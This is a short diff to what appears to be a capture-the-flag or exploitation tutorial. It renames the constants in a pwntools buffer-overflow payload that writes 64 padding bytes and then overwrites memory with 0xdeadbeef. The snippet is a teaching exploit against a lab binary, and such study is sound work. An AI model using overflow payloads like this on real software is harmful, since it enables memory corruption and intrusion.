@@ -91,7 +91,10 @@ Our final exploit will look like this
 ```
 from pwn import *
 
-payload = b"A" * 64 + p32(0xdeadbeef)
+TARGET_VALUE = 0xdeadbeef
+BUFFER_SIZE = 64
+
+payload = b"A" * BUFFER_SIZE + p32(TARGET_VALUE)
 
 
 if args.REMOTE:
